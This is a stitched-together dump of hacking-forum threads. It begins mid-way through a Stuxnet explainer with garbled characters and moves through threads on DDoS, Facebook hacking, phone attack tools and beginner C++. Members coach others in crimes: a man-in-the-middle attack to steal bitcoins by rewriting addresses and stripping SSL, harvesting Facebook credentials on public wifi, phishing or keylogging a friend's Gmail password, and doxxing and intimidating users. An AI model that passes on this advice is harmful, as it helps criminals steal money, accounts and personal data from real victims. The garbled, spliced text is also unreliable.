number of techniques, including modifying file creation and modification times to blend in with the surrounding system files and altering the Windows registry to ensure that the required Stuxnet files run on startup.  Once the archived file is downloaded, the Stuxnet worm unwraps itself to its full, executable form.Meanwhile, the original Stuxnet infection is still on the USB flash drive.  After successfully infecting three separate computers, it commits ���security suicide.�۝  That is, like a secret agent taking cyanide to ensure that she can�۪t be tortured to reveal her secrets, Stuxnet deletes itself from the flash drive to frustrate the efforts of malware analysts.Internally to the target computer, Stuxnet has been busy.  It uses its rootkit to modify, and become part of the OS.  Stuxnet is now indistinguishable from Windows; it�۪s become part of the computer�۪s DNA.  It�۪s now that Stuxnet becomes a detective, exploring the computer and looking for certain files.  Specifically, Stuxnet is looking for industrial control system (ICS) software created by Siemens called Simatic PCS7 or Step 7 running on a Siemens Simatic Field PG notebook (a Windows-based system dedicated for ICS use).  The problem facing Stuxnet at this point is that a computer can contain millions, if not tens of millions, of files and finding the right Step 7 file is a bit like looking for a needle in a haystack.  In order to systematize the search, Stuxnet needs to find a way to travel around the file system as it conducts its stealthy reconnaissance.  It does this by attaching itself to a very specific kind of process.:  One that is trusted at the highest levels by the OS and that looks at every single file on the computer.  Something like. . . . . .the scan process used by anti-virus software.  (In the attack on the facility in Natanz, Stuxnet compromised and used the scan processes from leading anti-virus programs.  (It�۪s worth noting that all of the companies whose products were compromised have long since remedied the vulnerabilities that Stuxnet exploited.)  Along the way, Stuxnet compromises every comparable process it comes across, pervading the computer�۪s memory and exploiting every resource available to execute the search.  All the while, Stuxnet is constantly executing housekeeping functions.  When two Stuxnet worms meet, they compare version numbers, and the earlier version deletes itself from the system.   Stuxnet also continuously evaluates its system permission and access level.  If it finds that it does not have sufficient privileges, it uses a previously unknown system vulnerability (such a thing is called a ���Zero-Day,�۝ and will be discussed below) to grant itself the highest administrative privileges and rights.    If a local area network (LAN) connection is available, Stuxnet will communicate with Stuxnet worms on other computers and exchange updates ��� ensuring that the entire Stuxnet cohort running within the LAN is the most virulent and capable version.   If an Internet connection is found, Stuxnet reaches back to its command and control (C2) servers and uploads information about the infected computers, including their internet protocol (IP) addresses, OS types and whether or not Step 7 software has been found.As noted earlier, Stuxnet relied on four Zero-Day vulnerabilities to conduct its attacks.  Zero-Days are of particular interest to hacker communities.:  Since they�۪re unknown, they are by definition almost impossible to defend against.  Stuxnet�۪s four Zero-Days included:    The Microsoft Windows shortcut automatic file execution vulnerability which allowed the worm to spread through removable flash drives;    A print spooler remote code execution vulnerability; and    TWO different privilege escalation vulnerabilities.Once Stuxnet finds Step 7 software, it patiently waits and listens until a connection to a PLC is made.  When Stuxnet detects the connection, it penetrates the PLC and begins to wreak all sorts of havoc.  The code controlling frequency converters is modified and Stuxnet takes control of the converter drives.  What�۪s of great interest is Stuxnet�۪s method of camouflaging its control.  Reporting signals indicating abnormal behavior sent by the PLC are intercepted by Stuxnet and in turn signals indicating nominal, normal behavior are sent to the monitoring software on the control computer.Stuxnet is now in the position to effect a physical attack against the gas centrifuges.  
I'm not reading anything revolutionary or new at all in there poppy. Stuxnet compromised the kernel. From there you can do anything really, this one was just very targeted.
Hi everyone,I wonder if anyone have ever runned Android application over Tails and tested for leaks. I am looking to run few applications over Tails (ex: PixelKnots) in secure way.Thanks for your help!
What do you mean by 'run over Tails'? I know Tails is a GNU/Linux distribution and I know Android. The two aren't compatible without you taking further measures to emulate the Android environment on Tails.. so in short.. I don't understand what you're trying to do but you've piqued my curiosity.
I may have missed the point in the first post, but using emulator I want to run PixelKnots and like Android apps.... I am just not sure about security risks it can bring or problems while trying to run emulator over Tails...Most popular emulator requires to install VB except Google's one... This is a problem for me to install VB over Tails or to install Google stuff...
 
Use a VPN? That should be fairly obvious.
So, they sent you an email or what?Like he said VPN, use a public wifi.
I was using some tool to hide my IP but yeah I should have used a VPN thanks schnitzelwagen. Gabriel  I have a friend who has a cousine working for them and he was told to warn me 
You shouldn't do DDOS unless you know what you're doing.
You're more likely to DOS the VPN, and if the authorities have YOUR IP, I guess you didn't do a DDOS (DISTRIBUTED Denial Of Service. Or does your computer have schizophrenia?)If you are trying on your own, your chances of DOSing the site is basically zero. Like Borax said, if you've no idea of what you're doing, stop.
it was not a Distributed denial of service, it was just a small dos , requesting a significant amount of packets on my own 
A "small DOS" doesn't even make a dent nowadays. So to paraphrase the3coder: what the fuck are you doing!?
okay to be truly honest, I dont know what I am being warned for, I dont know what I have done. They told me I did some dos and I can recaling perfoming some. like you say small DOS doesn't even make a dent nowadays, so its clearly something else that I have done, and thats what i am tring to figuire out. 
The fact that it doesn't make a dent doesn't mean it isn't illegal. Repeating myself here (slightly modified): you shouldn't do (D)DOS unless you know what you're doing. Now if you want to learn, that's fine. I'm just warning you that law enforcement doesn't take kindly to cybercrime. The biggest problem with that from our perspective is that general law enforcement is utterly clueless about the subject but we're still considered evil. Not a good combo for you to try stuff in.
Thank you for the advice, I honestly didnt think much about the law enforcement, like I said it was tiny I thought they might not even notice it. 
Good evening X-changersIm on my final year studying web development and the time has come for me to find a project, I couldnt think a better place to get some help other than this forum.Ive already come up with some interesting ideas such as software development for robotics and cloud computing security and development but Im more than open to any ideas anyone can offer.Thanks in advanceRegardsDasnoteXisT
I take it your school has given you a scope, requirements and a deadline for such a project? What are they?
its the level 2 project, on which we actually have to find 5 topics(projects) with 3 resources each and then on september we're gonna have to choose 1 as our final project and is due to May 2016. Basically, the only scope that we're given until now is three different fields Security, interactivity and Usability thats why i was thinking about cloud development and security.
You'll have to execuse me for not knowing what half of that there means. What's a "level 2 project"? What does your school mean when it says "topic"? Define "resources" please.. and how do security, interactivity and usability weave into this exactly?I'm going out on a limb here by assuming you'll need to produce some kind of product or working prototype of something sufficiently secure, interactive and usable. My apologies if I sound out of touch. School ended for me sometime deeply back into the last century so I'm not up to speed on the jargon.The words "cloud", "development" and "security" also mean next to nothing the way you're writing them down in a sentence now.Brainfart-alert: how about cloud-based neighborhood watch? Interconnect people's security cams, slap an app on top of it, get a view of the whole block instead of just your own house. Plenty of design decisions to be considered, pretty heavy security focus and this brainfart of mine requires a whole lot of additional thouht and refinement before it could become "a thing".Google some brainstorming techniques. There are plenty of simple methods out there for generating ideas.
PGP is secure but still crackable. Would it take someone longer to crack if you encrypted a message with Kleopatra, put it back on your clupboard and encrypted it again with Kleopatra?
Nope, makes no practical difference. Either your attacker has the means to crack your message fairly trivially and won't mind doing it twice, or the universe ends long before the first attempt succeeds.
Thanks. How secure is Bitmessage and TOR email providers? Can they be hacked like Gmail?
E-mail (I'm referring to the SMTP variant) is almost impossible to anonymize properly. I've tried and failed, but that's not to say others did succeed. Any anonymized e-mail service has *A LOT* of explaining to do before I trust it. The SMTP protocol simply wasn't meant to be anonymous, which should be obvious considering its primary use case and the radically different Internet it was created for.
http://rield.com/faq/why-is-facebook-bad. Facebook is evil, guys. There's at least a million reasons why you should close your facebook account right now and start hacking the life out of it. It's as if you were video chatting with your local cops every day, sending them pictures of yourself? And all the juicy details about your life, they must be enjoying themselves like little kids! Spread the word! Facebook must be defeated! (change your homepage too, b/c google is watching you ..)
I know, they got the whole internet, google, facebook, youtube, etc. They are just looking for each thing we do.For this, this is a very good and private filter search engine https://duckduckgo.com/html/ just for those dont know it, works same like google, but they save your privacity.
There is startpage too. I haven't used this a lot but seems good.https://startpage.com/
That was a great misleading title(not in a depreciate way though). Facebook's security system is not the best indeed but it is somewhat secure if you use it wisely! Unfortunately most of the people do not grasp basic computer skills - fulcral information leakage(which should be preserved), connections to various suspicious apps, trusting everyone they see on the Internet. This is not all.We should teach kids how to deal with this "weapon" they possess. Like you said, it's dangerous because the data that is virtually marked as "private" is as public as a coffee shop.I stay away from it.
Friendly enquiry, how do I hack Facebook?
You can't just "hack" Facebook. You need to research security flaws in the programming code.From there, you need to spend hours, days and even weeks researching this and how you can exploit this.Alternativley, work for Facebook for years, earn trust of managers and directors (hell, even CEO) and eventually sell out the root password to skids.Even then, they have backup servers located around the world that would change the password back to a specified root passphrase unless specifically changed by the sys admin.
What if i some how got into the admin. account?
Well, firstly, congratulate yourself, as you have achieved that which takes years of coordinated planning to do. You have successfully hacked into facebook, and can effectively do as you please. Until you get detected, that is. Then Zuck and the investors shall kick your ass into jail for the rest of your fucking life.
Well, if I was undetected and if the changes were sublime? In effect I could control the online social life of 1 billion people?
There is no "admin" account. Only profiles.The profiles.They evolve faster than mankind.Watching. Always watching.There is no escape. Once you have a Facebook profile, you can NEVER remove it.Even if you deactivate your account, your profile still exists. It is just hidden. Stil lcollecting data. Evolving. Learning. Dormant.Facebook. Always Watching. There is NO.ESCAPENO ESCAPE!
Of course, there is the root. The root is the key.The root key to the main host server.Usually down for a couple of seconds a year for updates. Never longterm downtime, otherwise the Facebook users would turn to rioting and Humanity would collapse.The host is the nectar. Take away the NEctar and the bees die.Root Nectar. Bees of the System.01110010001100000100111101110100010011100011001101100011011101000100000001110010So yeah, the root password is changed probably about 5-10 times a day to avoid people like us from breaking in.Same with the Queen Bee. The Queen Bee is replaced usually within a day of being elected.The queen bee, been the root password, is useless once replaced.
Sounds a little too movie-like to be real, I would know.
One could utilize MITM and se-toolkit at a far off coffee shop and harvest FB credentials all day.  This user is unsure of what legal ramifications may befall anyone who engaged in such behavior.
@eggmanI think they're talking about getting facebook attacked directly, via botnet or something more "reliable".A DDoS wouldn't be very effective for long amounts of time, however if someone could actually hijack the main DNS that is hosting facebook, then a MLITM can target facebook over the whole internet, even if it was only for 30 minutes.
How would one wipe their account completly? and would and amateur like me do it anytime soon?
That's not gonna happen. Even if you found a button which said "Delete Profile", that would probably just flag your profile as "Tried to delete profile!"...
Attack the users, doxx them in the most embarrassing way possible, and intimidate them into leaving social media for good. Make them aware of how stupid it is to share all that personal information and communications online.
@Kazuya Yes, indeed with all the talk about "rooting the Gibson". It is shameful to admit but there is humor in using a silly tool like drifnet in a public space, watching the porn pictures fly by in the terminal, looking around the trying to decide which hipster in what corner is looking at porn while slurping on their vente mocha triple soy.Public wifi, Ettercap, port forwarding and webspy is quite fun for that up close and "personal browser" touch.@Indigo1011Still, it would be interesting to harvest FB credentials over public wifi during the course of a week, probably gleaning NFO from thousands of users.  One can imagine all sorts of potential in having thousands of FB credentials, given certain moral and ethical flexibility those imaginings could even be brought to bear in a coordinated effort. 
A much better way to do things is to just keep your Facebook like a contemporary human, just don't incriminate yourself or give out any usefull info. Even better, make a bunch of accounts and give out false info. Even better make a bot that does said things. Even better....yeah I guess your right...hack FB....................developers!
@xorcist Werd
Or physically break into their physical servers and upload a virus that corrupts everything?
Hmm i guess that would be really hard. I think fb is really protected all the way you can imagine. So and if you really get the virus on the system and shut all down they just take a backup. They have several servers all around the world which you have to download your virus simultanously and after a while, when it's in their back up to start it. I think a nuclear attack would be easier, consider this before ;-)
Double Post, sorry
One other thing to think about is bitsquating.  The facebook servers are probably run at pretty high temperatures, just like google and apple who run their servers at upwards of 80 degrees, and infact recomend that.  This causes slight changed in code sometimes which can cause small biterrors in the domain of a one of the servers.  These can be abused by taking buying the a domain that is not already owned but could be the result of one of these biterrors.  For facebook it would be something like facebook.com which because of the biterror changing one of the 1s or 0s in the code becomes facebogk.com, facebkok.com, fmcebook.com or something like that, however facebook.com would not be used, it would be whatever the query server is; googles is gstatic.com.  If you buy one of these, when there is an biterror a query comes in requesting a some information, and you can send back whatever you want.  Its pretty cool, here's a defcon on it: https://www.youtube.com/watch?v=ZPbyDSvGasw
This bit squadding video you've posted is actually interesting. I would never had the idea of this. To hack a server just on a little electronic failure, really clever guys. That may work for fb but it's important where you put your virus in. Maybe kinda worm which spreads himself on a system?
I have been searching around internet/DW trying to find any means of free XBox Live Gold all I have found is a lot of BS. But all the times their servers have been hacked there has to be some means of doing this right? I was wondering if anyone knew legit means of getting XBLG for free, or perhaps ideas of how it may be done. Or even if it could be done. And if it could I'd like to plant the idea for some group to just mass 12m subscriptions for people :-p I figure a forum like this would be the place for the answers. 
This is very hard to accomplish. You know those cards you get at GameStop and shit? Yeah, well they won't work until an employee scans it to activate it. You'll have to create a program that randomly generates letters and numbers and hope that some random kid getting his card activated has the same code as the one your program hit.
When they find out your brutforcing the shit out of their webshop they will kick your ass to the moon and back. You aren't anonymous there.Isn't there a way to install your game over an usb stick or somehow? Are they locking this?
I definitely know its possible, but how would you go by unlocking any car around you with a phone or computer or something?
Doing this from scratch requires an awful amount of studying the workings of existing locks. Intercepting and decoding the signals sent from the key to the car, figuring out any crypto between them and poking for weak spots. Once you have that, you'd have to be lucky enough to have the lock operate in a frequency band that's available to a phone's radio. Once you have that covered, you'll need to write low-level software to directly control the phone's radio chip and emit the proper signals. So while I agree that it's possible, for a limited number of cases, it'll be quite hard to pull off.
Isn't it always the same code which is sent from the key? So you just have to buy a radio (send/receive) in the right frequency and listen for the unlock signal from the keyholder. When you repeat this sequence you will be able to open the car then.I don't think that there is actual a dynamical encryption on the key, that would mean you have to generate everytime a new key-pair from the car and the key, which is also transferred by a handshake who you could read out. So it should be always the same code (the keys are all together programmed one time from the garage).
@TheCollector314:You're not the first one to think of this, that's why most manufacturers nowadays tend to actually encrypt their signals & change them every time.
What the3coder said.. it's not that hard to create a mechanism that can resist simple replay attacks.
Yeah, um. I think I'll pass on this idea. As borax knows, I'm still new to a lot of this stuff
I'm a fairly accomplished C++ programmer but this small project is new to me. I intend to reverse-engineer the USB protocol for a LED lighting controller. How do I go about sniffing the USB commands and data as they are sent by a Windows-based closed-source application?
Hey BoraxHave you tried an USB Logger? On google seems to be some software which shows you what goes out.
Hello everyoneIs there a possibility to acces the data on the wlan chip of an android device directly? I'd like to receive the data in a WLAN which should go to a different device (Sniffing Chats etc).Maybe it'd be also possible to change your IP and MAC and then your device thinks, that you're receiving those packages? So your browser or your whatsapp just directly shows the stuff which the other one receive?I know that https will be encrypted but stuff like http and so on shouldn't be?Thanks in advance
This depends a lot on how the WLAN is set up. A rooted android device should be able to put its wifi device in promiscuous mode and log any traffic the way you describe, as long as you're associated with the network in question. Any halfway decent WLAN encrypts differently between the AP and each client device, though, making it much harder to sniff anything meaningful.
Hi guys, I want to do a Man-in-the-middle attack via a physical server.  Does anyone know how to do this/could link me to something helpful? Thanks
I know how. Do you have access to a position in the actual middle, network-wise? If so, how much freedom do you have there?
I'm not quite sure what you mean by actual middle, but if you mean in between the router and the server then yes.  I have I have a decent amount of freedom, BUT I do not know the password to the server if that matters.
You need a device on which you can mimic the protocol that's being used and be able to log/sniff traffic as it passes. If it's using something like SSL, you have a bigger problem but not necessarily one that can't be overcome. As long as traffic passes *through* your system, or you can make it do so, on its way from A to B, you're mostly set. If you're on the same ethernet collision domain that's also good, but hardly anything works that way anymore. Could you elaborate some more on what exactly you're trying to accomplish? Especially details about the network topology, hardware in use and protocols involved.
Alright so the server uses SSL, I hope that shouldn't be hard to get around.  I'm trying to intercept and change bitcoin account information, and I'm using a mac, but it has a paralel so I can run windows to if that is needed.  The network uses OpenDNS to censor the web, which I hope isn't a big deal.  As far as topology, computers connect to routers, which are connected to a 32 port switch, which is connected to the a basic firewall, which is connected to the internet.  The targets on my end are all using Laptops.  None of them have any sort of real secuirity as far as I know.  If theirs anything specific you need to know to help let me know.
You need a setup like this:[Target]------[You]------[Router/Internet]-----[Bitcoin site]or[Target]-------[Router/Internet]-------[You]-------[Bitcoin site]Otherwise you're not in the correct position to do a MitM and you need to consider other options. SSL complicates things *A LOT* especially since you're likely dealing with someone savvy enough to notice you've stripped it off or are faking a certificate. Before I elaborate any further, do you have the actual MitM position as shown here?What you'll essentially be doing, is running a transparent proxy between the target and the bitcoin site. Manipulating packets in transit in a sensible way, especially bitcoins, adds quite a lot of complexity. Want to steal their coins? You'll need to string-replace BTC addresses on the fly. In all fairness, if you're not up to speed on how to set up the MitM in the first place I doubt you'll be able to pull the next bit off without getting caught. My advice? Don't do it just yet, practice this trick on your own home network and only venture out into the real world once you've completely mastered it.
Dear schnitzelwagenFor the MitM Attack just try this, a friend of mine said it'd work:You emulate the router by sending out the same ip and mac. When a device now start a connection (or you throw it out for reconnection) it thinks thar you are the router. So it sends you all the data and you just have to forward them. When someone scans the network, he will see you, so you aren't invisible with this technique.Some thoughts behind: when there is a key exchange, you can change the key and send your public key to the victim. Then he sends you an encrypted package which you can encript with your private key. Then encrypt it again with the public key from the site. This may slow down traffic from the victim.
Borax,I've that essencially the second setup, and as you suggested I deffinatly will practice this before I actually try this on someone.  Would taking credit card numbers be easier?  Also @TheCollector Ill try that, not quite sure what your saying but I can try to figure it out.
Acting as a transparent entity is definitely a lot easier than manipulating the datastream on the fly. Practice this by intercepting some of your own innocent web traffic. Once you get the hang of that, logging and intercepting stuff from POST requests for instance, you can move it up a notch. Have a look at the mitmproxy (clearnet: http://mitmproxy.org/) package for Linux. It does a lot of what you want, but make sure you understand what it's doing completely before trying this in the wild. Spoofing certificates (or stripping SSL completely and getting target to enter details into a cleartext form) is probably the hardest part of your challenge.
I was wondering if anyone could let me know how to get a a Gmail password, or if they could do it for me. Thanks! 
There's a lot of things at play here. Do u know that guy personally? Does he/she trust links that u send him/her? Do you have access to the hardware he's using? How much coding knowledge do u have?
Unfortunately, right now I only can hack hotmail emails. But yes to the first 2 and not much coding. I have been learning though.

If you know his email address, send a phishing link to him and ask for his email, password, etc. If he trusts you and the link\page looks legit, you could possibly get his password. I'm sorry if this doesn't help, but I used this to get my friend's password
Can you get access to their computer? If you can you can access there keychain passwords using the security command, or use HTML to change passwords that are saved to text.  Or just keylog their machine..
Hello,I turned my cellphone's mobile data on today and a download started suddenly. It was over in a second and the file that was downloaded is called "login.bin". It was rather odd as I had not done anything to prompt this download.
Strange... I'll look in to it for you :)
Thank you.
 Hmm... my guess would be that the file downloaded is a way for the phone data network to identify you or a way for the phone to login to the network. I couldn't find any valid info for you so this is all I got that I can offer.
yep, i'll agree with knex must've been your mobile's network login information,something like cookies in order to use 3g on your phone
Cheers guys.
 
Buy and launder bitcoins.
 
Nope. Well, if you actually use a RAT, thus attacking the user's system itself. If you try with some XSS and the site has counter-measures, then it may fail.
So I guess it's just that easy...damn
I highly recommend phishing, considering I don't believe it's illegal, but I highly recommend not taking my advice on that.But, phishing still works surprisingly in todays world, you can get SSN's, Credit Cards, Contact Info, Addresses.While Zyx's method works, I recommend doing a clientside DNS hijacking. Less detectable, but requires you to physically be at the location, so it's a tradeoff of if the alphabet soup groups do investigate, they'll find it, but if you retrieve it before it is reported, can work amazing wonders. Some people say keyloggers, but those take too much time for me to search through all the logs made.Have fun!*EDIT*I do realize that it's technically not a DNS hijacking if it's clientside, but, just an easier term to remember, and understand :)
I will advice you to build a simple bot, just to grab fields and sensitive data. You need to use Regular Expressions.

Is it safe to download pdf's on tor ? 
You should not open any type of file on a system that has any information that could help identify yourself, or a system that is connected to the internet because it can expose your real IP. See the DEFCON talk below, it shows you that a .doc file can expose your IP.Dropping Docs on Darknets: How People Got Caught (Caution: Clearnet link)You can use a OS like Tails for better security, it forces all your traffic through Tor or blocks it.Tails - Privacy for anyone anywhere (Caution: Clearnet link)
Thank you smst, this is great 
I'm wandering if running Tor on a device with GPS, GSM, and other tracking friendly features is any safe. TorProject advertises it as safe but... Is it? I mean, is it wise surfing hidden services in a device with so much personal info?However, I'm curious about it and I'm thinking about giving it a try, but...Do you folks use it? If so, what would be some safe safety measures to take?
If you are browsing legal websites then, in my opinion, you wouldn't have anyting to worry about. But if you are just exploring the dark web and may, even if by accident, go to questionable websites then I would recommend not using it. I don't have any proof or reason behind it other than the fact of GPS and other means of tracking as well as how insecure mobile networks can be. Hopefully someone with more knowledge on the subject will post as well.
The networks in general aren't the problem. Encryption is encryption, that won't be broken any more easily because you're on a different network. They could flag you for using TOR but they won't be able to see what you're doing on TOR.*HOWEVER*Orbot is an Android app. Android in and of itself, even if rooted, is not a shining paragon of security. Heck, it's a security crapfest really. You do not want to use Android for any kind of truly secret communications. Whether or not it's safe for you depends a lot on the threat you're facing. Planning to watch kiddy porn on your phone? I'd say go ahead, do not pass 'go' and go straight to jail please. Only trying to bypass your corporate network's firewall or snooping filters? TOR might help you there, although you'll also be raising a HUGE red flag on the intrusion detection system which you'll no doubt be asked to clarify. Want to safely use untrusted public wifi? Then Orbot is just fine.
Well, I know that the Android is not safe at all to browse illegal onions, I don't do it on Tails and less I would do it on an Android device.My concern is, most of all, my personal info in the device - the danger of it leaking into some malicious onion and then me being tracked by some bad intended people.I know that some people use it in some harsh regime countries to access and pass info to - and from - the outside, therefore, it must not be that insecure, right?I know that the three letter agency already have me on a list (at least) since I first searched for Tor, Freenet or i2P on clearweb. And, from those, we have no place to hide or device to cloak us.
Malicious onions exist and you can't tell beforehand. If you're worried about any information leakage, don't use a device that has such information to browse.
So I've been looking in to it a lot recently and I have come up dry. I can barely find anything regarding creating a phishing website and I need some help. I have a free .tk domain set up and free website hosting, which is (Clearnet) freehostia.com (Clearnet). I saw a link on how to do it, but sadly part of the code you need to change was removed so I wasn't able to progress any further. I don't need an in-depth tutorial, although it will be helpful. I just need to know the code.
Hey Everyone, Just out of curioisity, whate the diffrence between the two? Im only familiar with Tor but i havent tried the oher one.
I believe I2P is a network that was built from the ground up within the darknet.  Tor and i2p just have different access to different sites contained in the darknet, both have their own security faults/advantages.Here's the clearnet link to the I2P website: https://geti2p.net/en/
@Nephilim2015: ViceofDF is right... Tor and I2P are just 2 systems that operate side-by-side... The move you can do is to try it and see if it fits what you want to do over deepweb...
Thanks guys Ill check it out 
Hey guys I need some help with d0xing. I can easily get phone numbers, IPs, emails, etc but I want the more personal stuff. Like SSNs or stuff like that. Thanks in advanced. 
How to find basic info about someone.
Maybe I have seen to many movies etc... Bearing that in mind please don't laugh at me.Is it possible to create a heavily encrypted phone (similer to blackphone) with the following extra features?:1: Hack into WIFI points automatically when they come in range2: Bluejack other devices3: Hack into wireless cameras and other wireless devices4: Facial Recognision Application (Integrated with image search and social media to find identities of person etc.. Then using free public gov tools check if they have a criminal record etc..)5: Device profiler compiler. Eg:Device: BlackberryOwner Name: John JohnMost Common Search: I am stupidCurrently linked to social media: Facebook/Twitter/Instagram6: Device GPS enabled so you can hack someone elses phone and then always know where it is.7: All traffic routed through tor network or I2P ( saw a post saying you could route traffic through multiple wifi points and exit via tor node. Or something along those lines )Is this possible. If so has it been done can you buy it somewhere? I am a noob in some areas and advanced in others. That is why I came to this forum.Karismik
I'm pretty much certain some of those features are possible, however I don't believe you'd be able to buy it from someone. As well some of the features that are automatic (Hack into Wi-fi, Facial Recognation, GPS) I personally believe those would be impossible, at least on a Black Berry. As for how to make it, I don't know man. Sorry.
@karismikYes, this is very possible, and I actually do have a phone like that, however I don't make calls from it.I've rooted it, and installed a TOR system on it.Combined with the following programs:Dsploit (Actual hacking via wifi, DNS spoofing, and so much more)Netspoof (hacking pranks)Intercepter-ng (network sniffer)Aircrack-ng (You can only get the terminal version of this on an android as far as I know)and a few other programs that I've made myself, such as a bruteforcer and bluetooth hijacker.So yes it is possible, and with hijacking webcams they've recently found a 0-day for them, can't wait for DEF CON!
@Indigo1011How did you make it? Can i buy one from you?
I'd recommend you get an Android phone. You can actually run backtrack/kali on a good android phone if it's fast enough. Other cool apps: WifiKill - you can kick people off wifiPiik - you can see what pictures are being loaded through the wifi
@SoldierBoy Thanks :D
@karismikAs SoldierBoy said, you don't need to buy one from me. Just get an android phone (simple, yet good processor) and root it to gain administrator access.From there I could point you in the direction of some good (albeit illegal, shhhh don't tell) apps that I use to hack wifi and sniff passwords via that phone.Let me know how it goes!
I would suggest the Oppo N1, it is based on Cyanogenmod (an open source fork of android without ANY commercial stuff on it) and is rooted by default. Careful, it's quite expensive... </product ad>
WATCH_DOGS much? :PBut, yeah, get an Android. It's basically a small computer that can make calls. I believe you could run pretty much any Linux on it.
You may also want to look into a Nokia N900 (its a few years old now) but it had a lot of development done for pen testing and is probably the closest your going to get to a turn key solution for any of these tools. If you are considering newer hardware, look for phones with wifi chipsets that can enable rfmon mode (not only at the driver level but also at the firmware). I believe the GS1/2 has rfmon support through modified drivers and custom wifi chipset firmware, try to avoid Broadcom chipsets even though theyre almost ubiquitous these days. You can also go another route and plug external usb wifi adapters in via a USB OTG cable (and seperate powersupply just for wifi adaptor) but that requires you to build a custom ROM (with your wifi adapters drivers build against the ROMs specific kernel IIRC) and use a chroot jail to host the tools and is a pretty untidy solution. As for facial recognition, thats a pretty heavy task, you'd likely have to offload that to a beefier backend server and the quality required to match faces accurately would probably limit you to matching on a per face basis via still image, rather than a constant video stream. The sad thing is, thats the EASY part, getting the bio database + correlated names and data is almost certainly harder to obtain unless you have access to facebook, FBI etc databases.Your not going to find a turnkey solution thats for sure, most of these will  require some form of coding ability, if your serious start learning C++, python, java (android UI) etc or become very rich and pay some very high-end developers to make it for you.@Zyx, that's exactly what I thought when I first read this post, suprised electrical/data flow profiling wasnt mentioned to be honest :D
Thanks for the great responce all. I am thinking of trying to root the blackphone. It's a pretty heavy task but if it works it will be far more secure then any android device.
If you want to hack into wifi networks you need hardware support, if this is not a deal breaker then a rooted android device can still do a few tricks, I also recommend the apps listed by Indigo1011 (although aircarck-ng will be useless without supporting hw mentioned earlier)
I would argue that the blackphone is not more secure than any android device. In fact the NSA themselves use an android ROM of their own called FishBowl. Google it :)
@Solider BoyAlso I preffer duckduckgo to google. Post Prism..
I'm so sorry for bumping an extremely old thread, but I kind of wanna try this out. Are there any other good androids for this that are hopefully less that $200? I don't want to spend so much for an Oppo N1 since I already have an expensive phone.
Now with Kali NetHunter(Linux) you can use an entire range of devices. The development for Samsung devices is currently the most widely available. Look it up, and try it out.nethunter.com(Caution: Clearlink);-)
This is thread is for C++ code to be pasted! I will include some basic programs I have been making and will later post the code for a password stealer, key logger and finally a virus. I am quite new to C++ so help would be appreciated, however contact with me will be limited to this post.
This is a very basic program. Any advice on how to create a string array in C++? I want to do it for a AI program I'm making, which is similar to cleverbot/jarvis. I will also be posting a interactive quiz game, before moving on to posting a password stealer.// This program converts temperature values from Celsius to Fahrenheit#include <cstdio>#include <cstdlib>#include <iostream>using namespace std;int main(int nNumberofArgs, char* pszArgs[]){    // Displays text instructions    int celsius;    cout << "Enter the temperature in Celsius:";    cin >> celsius;     // Formula for converting Celsius to Fahrenheit    int fahrenheit;    fahrenheit = celsius * 9/5 + 32;     // Displays result of calculation    cout << "Fahrenheit value is:";    cout << fahrenheit << endl;     // Pauses program before closing on next button press    system("PAUSE");    return 0;}
Terrible.This is a basic example that you can find pretty much in every tutorial. Also, with system("PAUSE") this program is not portable and a security risk.About string arrays, why not use std::vector<std::string>> ?
Do what the3coder says and replace that horrid system("PAUSE"); with cin.ignore();. Oh and I personally hate those 'using' shortcuts to avoid typing the namespace. Never mind the rounding errors introduced by using ints here. While the example is tiny, I usually choose to put algorithms into their own function.#include <iostream>int toFahrenheit (int tempCelsius) {  return ( tempCelsius * 9/5 + 32 );}int main() {  int tempCelsius;  std::cout << "Enter the temperature in degrees Celsius: ";  std::cin >> tempCelsius;  std::cout << "Fahrenheit value is: " << toFahrenheit(tempCelsius)  << std::endl;  std::cin.ignore();  return(0);}
Thanks for the feedback it has been very helpful, I should have said that I am learning C++ and this is a kind of journey for me. Have a look at this program, I want to make a 2 string arrays. One for good words, one for bad words and use else if statements so the program appears to be responding to users when asked how they are feeling. I will do my best to take on board your advice, however I am using Code::Blocks, which seems to dislike some functions.#include <iostream>#include <string>#include <sstream>#include <conio.h>#include <windows.h>#include <stdio.h>#include <stdlib.h>using namespace std;int main() { // This  is the first line that prints Hello! on screen.   std::cout << "Hello!\n";   // Pauses program for a second.   Sleep(1000); }    // Declares the user name variable and asks the user to input a value.    string yourName;    cout << "What's your name? ";    cin >> yourName;    cout << "Hello, " << yourName << " I am a Barry.\n";    // Pauses program for a second.    Sleep (1000);    {        // Declares user age as an integer and asks user to input value.        int yourAge;        cout << "How old are you? ";        cin >> yourAge;        if (yourAge <=25)        {            cout << "Ah a young one!" << endl;        }        else        {            cout << "Studies show brain capacity reduces with age." << endl;        }        // Pauses program for a second.        Sleep (1000);    }    {        // Declares users feeling variable a asks user to input value.        string yourFeeling;        cout << "How are you feeling? ";        cin >> yourFeeling;        cout << yourFeeling << "? Interesting....\n";        // Pauses program for a second.        Sleep (1000);    }    {        cout << "Now I will now test your intelligence...\n";        // Pauses program for 1.5 seconds.        Sleep (1500);        //Declares answerOne variable as a short integer value for users age and asks user to input value.        short int answerOne;        cout << "What is 2 plus 2? \n";        cin >> answerOne;         {             // If statement that gives a response depending on whether the value given by the user is correct or not.             if (answerOne == 4)             {                 cout << "Correct." << endl;             }             else             {                 cout << "That was not the correct response.\n" << endl;             }             // Pauses program for a second.             Sleep (1000);         }        cout << "Next question...\n";        Sleep (500);        cout << "What is 8 times 8? \n";        // Declares answerTwo variable as integer value and asks user to input a value.        int answerTwo;        cin >> answerTwo;        {            //If statement that gives a response depending whether the value given by the user is correct or not.            if (answerTwo == 64)            {                cout << "Correct.\n" << endl;            }            else            {                cout << "Wrong!\n" << endl;            }            // Pauses program for two seconds.            Sleep (2000);        std::cin.ignore();        return(0);    }    } }
